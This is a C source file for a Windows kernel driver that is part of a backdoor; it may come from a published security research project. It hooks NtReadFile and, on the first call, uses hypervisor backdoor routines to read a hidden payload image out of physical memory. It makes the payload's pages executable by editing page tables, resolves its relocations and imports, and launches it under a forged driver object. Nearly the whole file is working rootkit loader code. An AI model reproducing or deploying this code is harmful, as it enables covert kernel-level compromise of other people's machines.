#include "stdafx.h"

// size of the nt!NtReadFile() call stub
#define MAX_CALLGATE_LEN 0x40

// max driver name length in bytes
#define MAX_DRIVER_NAME 0x100

// dummy driver name
#define DRIVER_NAME L"Dummy"
#define DRIVER_NAME_LEN 10

typedef NTSTATUS (NTAPI * func_NtReadFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key
);

// parameters passed from the backdoor client
DRIVER_PARAMS m_Params;

// callgate for original nt!NtReadFile()
UCHAR old_NtReadFile[MAX_CALLGATE_LEN];
//--------------------------------------------------------------------------------------
void *bd_alloc(size_t size)
{
    // heap alloc
    return I_ExAllocatePool(NonPagedPool, size);
}

void bd_free(void *addr)
{
    // heap free
    I_ExFreePool(addr);
}

void bd_sleep(int msec)
{
    // not implemented
}

void bd_yeld(void)
{
    // switch execution to toher thread
    I_ZwYieldExecution();
}

void bd_printf(char *format, ...)
{
    func_vsprintf f_vsprintf = (func_vsprintf)ImportGetProcAddress(0, H_vsprintf);

    if (f_vsprintf)
    {
        va_list arg;
        char buff[DBG_BUFF_SIZE];

        va_start(arg, format);
        f_vsprintf(buff, format, arg);
        va_end(arg);

        I_DbgPrint(buff);
    }
}
//--------------------------------------------------------------------------------------
PDRIVER_OBJECT DriverObjectAlloc(PDRIVER_INITIALIZE DriverInit)
{   
    OBJECT_ATTRIBUTES ObjAttr;
    PDRIVER_OBJECT DriverObject = NULL;
    ULONG ObjSize = sizeof(DRIVER_OBJECT) + sizeof(DRIVER_EXTENSION);

    // get object type address
    POBJECT_TYPE *ObjType = (POBJECT_TYPE *)ImportGetProcAddress(0, H_IoDriverObjectType);
    if (ObjType == NULL)
    {
        return NULL;
    }

    // allocate driver name
    PWSTR lpszName = DRIVER_NAME;
    PUNICODE_STRING DriverName = (PUNICODE_STRING)
        I_ExAllocatePool(NonPagedPool, sizeof(UNICODE_STRING) + MAX_DRIVER_NAME);

    if (DriverName == NULL)
    {
        return NULL;
    }

    // fill name and object attributes
    DriverName->Buffer = (PWSTR)(DriverName + 1);
    DriverName->Length = DriverName->MaximumLength = DRIVER_NAME_LEN;
    memcpy(DriverName->Buffer, lpszName, DRIVER_NAME_LEN + sizeof(WCHAR));    
    
    InitializeObjectAttributes(
        &ObjAttr, DriverName, OBJ_PERMANENT | OBJ_CASE_INSENSITIVE,
        NULL, NULL
    );

    // allocate driver object
    NTSTATUS ns = (NTSTATUS)I_ObCreateObject(
        KernelMode, *ObjType, &ObjAttr,
        KernelMode, NULL, ObjSize, 0, 0, &DriverObject
    );
    if (!NT_SUCCESS(ns))
    {
        return NULL;
    }

    memset(DriverObject, 0, ObjSize);

    // fill driver object
    DriverObject->DriverExtension = (PDRIVER_EXTENSION)(DriverObject + 1);
    DriverObject->DriverExtension->DriverObject = DriverObject;
    DriverObject->Type = IO_TYPE_DRIVER;
    DriverObject->Flags = DRVO_BUILTIN_DRIVER;
    DriverObject->Size = sizeof(DRIVER_OBJECT);    
    DriverObject->DriverInit = DriverInit;

    memcpy(&DriverObject->DriverName, DriverName, sizeof(UNICODE_STRING));
    memcpy(&DriverObject->DriverExtension->ServiceKeyName, DriverName, sizeof(UNICODE_STRING));

    return DriverObject;
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverMain(void)
{   
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(m_Params.DriverBase, ((PIMAGE_DOS_HEADER)m_Params.DriverBase)->e_lfanew);

    // payload physical pages map is located at the end of the driver image
    uint64_t *PagesMap = (uint64_t *)RVATOVA(m_Params.DriverBase, pHeaders->OptionalHeader.SizeOfImage);
    uint64_t Ept = 0;

    // bind current thread to the specific processor
    KAFFINITY Affinity = (KAFFINITY)I_KeSetSystemAffinityThreadEx(1);

    // get current EPT address
    if (backdoor_ept_addr(&Ept) != 0)
    {
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): CR3 = 0x%llx, EPT is at 0x%llx\n", m_Params.Cr3, Ept);

    // allocate memory for the payload data
    ULONG DataSize = m_Params.PayloadPagesCount * PAGE_SIZE;
    PVOID Data = I_ExAllocatePool(NonPagedPool, DataSize);
    if (Data == NULL)
    {
        goto _end;
    }    

    for (ULONG i = 0; i < m_Params.PayloadPagesCount; i += 1)
    {
        // read payload page from the physical memory
        if (backdoor_phys_read(PagesMap[i], RVATOVA(Data, PAGE_SIZE * i), PAGE_SIZE) != 0)
        {
            goto _end;
        }        
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): %d payload memory pages read\n", m_Params.PayloadPagesCount);

    pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);

    // allocate memory for the payload image
    ULONG ImageSize = _ALIGN_UP(pHeaders->OptionalHeader.SizeOfImage, PAGE_SIZE);
    PVOID Image = I_MmAllocateNonCachedMemory(ImageSize);
    if (Image == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: MmAllocateNonCachedMemory() fails\n");
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Payload image is at "IFMT", 0x%x bytes\n", Image, ImageSize);

    // copy payload headers
    memset(Image, 0, ImageSize);
    memcpy(Image, Data, pHeaders->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    // copy payload sections
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        memcpy(
            RVATOVA(Image, pSection->VirtualAddress),
            RVATOVA(Data, pSection->PointerToRawData),
            min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
        );

        pSection += 1;
    }

    for (ULONG i = 0; i < ImageSize / PAGE_SIZE; i += 1)
    {
        // make page executable
        if (backdoor_make_exec_pt((uint64_t)RVATOVA(Image, PAGE_SIZE * i), m_Params.Cr3, Ept) != 0)
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: backdoor_make_exec_pt() fails\n");
            goto _end;
        }
    }

    // flush TLB and invalidate CPU caches
    backdoor_invalidate_caches();
    bd_yeld();    

    if (!LdrProcessRelocs(Image, Image))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: LdrProcessRelocs() fails\n");
        goto _end;
    }

    if (!RuntimeProcessImports(Image))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: RuntimeProcessImports() fails\n");
        goto _end;
    }    
    
    PDRIVER_INITIALIZE DriverInit = (PDRIVER_INITIALIZE)
        RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);

    // allocate dummy driver object
    PDRIVER_OBJECT DriverObject = DriverObjectAlloc(DriverInit);
    if (DriverObject)
    {
        // call payload image entry point
        Status = DriverInit(DriverObject, &DriverObject->DriverName);

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Status = 0x%.8x\n", Status);
    }      
    else
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: DriverObjectAlloc() fails\n");
    }

_end:

    if (!NT_SUCCESS(Status))
    {
        I_MmFreeNonCachedMemory(Image, ImageSize);
    }

    if (Data)
    {
        I_ExFreePool(Data);
    }    

    I_KeRevertToUserAffinityThreadEx(Affinity);

    return Status;
}
//--------------------------------------------------------------------------------------
NTSTATUS NTAPI new_NtReadFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key)
{
    uint64_t Addr = 0;
    uint32_t Val = 0;

    lock_aquire(DRIVER_LOCK_ADDR);

    // get call counter address
    if (backdoor_ept_info_addr(&Addr) == 0)
    {
        // read call counter
        if (backdoor_virt_read_32(Addr, &Val) == 0)
        {
            // check if hook handler wasn't executed yet
            if (Val == 0)
            {
                // exeute main function
                DriverMain();
            }

            // update call counter
            backdoor_virt_write_32(Addr, Val + 1);
        }
    }

    lock_release(DRIVER_LOCK_ADDR);

    // call original function
    return ((func_NtReadFile)&old_NtReadFile)(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        Buffer,
        Length,
        ByteOffset,
        Key
    );
}
//--------------------------------------------------------------------------------------
void DriverUnload(PDRIVER_OBJECT DriverObject)
{   
    // ...
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath)
{
    DriverObject->DriverUnload = DriverUnload;

    return DriverMain();
}
//--------------------------------------------------------------------------------------
// EoF